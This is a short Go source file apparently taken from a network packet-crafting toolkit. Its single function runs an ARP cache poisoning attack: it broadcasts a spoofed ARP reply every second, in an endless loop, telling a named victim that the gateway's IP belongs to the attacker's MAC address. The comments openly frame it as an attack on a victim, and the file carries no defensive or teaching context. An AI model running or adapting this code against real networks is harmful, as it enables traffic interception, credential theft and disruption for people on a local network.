package arpcache

import (
	"fmt"
	"log"
	"net"
	"time"

	utils "main.go/Utils"
	craft "main.go/packet"
	socket "main.go/supersocket"
)

func arpcachepoisoning(interfaceName string, victimsIP string, gatewayIPs string) {
	// Initialize the SuperSocket
	ss, err := socket.NewSuperSocket(interfaceName, "")
	if err != nil {
		log.Fatalf("Failed to create SuperSocket: %v", err)
	}

	// Get your (attacker) MAC address
	attackerMAC, err := utils.GetMACAddress(interfaceName)
	if err != nil {
		log.Fatalf("Failed to parse attacker MAC address: %v", err)
	}

	// Get the victim's IP address
	victimIP := net.ParseIP(victimsIP)
	if victimIP == nil {
		log.Fatalf("Failed to parse victim IP address")
	}

	// Get the gateway's IP address
	gatewayIP := net.ParseIP(gatewayIPs)
	if gatewayIP == nil {
		log.Fatalf("Failed to parse gateway IP address")
	}

	// Run the ARP cache poisoning attack indefinitely
	for {
		// Craft the ARP reply packet
		packet, err := craft.CraftARPPacket(attackerMAC, "ff:ff:ff:ff:ff:ff", gatewayIP.String(), victimIP.String())
		if err != nil {
			log.Fatalf("Failed to craft ARP packet: %v", err)
		}

		// Send the ARP reply packet
		err = ss.Send(packet)
		if err != nil {
			log.Fatalf("Failed to send ARP packet: %v", err)
		}

		// Print a message for each packet sent
		fmt.Printf("ARP reply sent to %s: %s is at %s\n", victimIP, gatewayIP, attackerMAC)

		// Wait a bit before sending the next packet
		time.Sleep(1 * time.Second)
	}
}
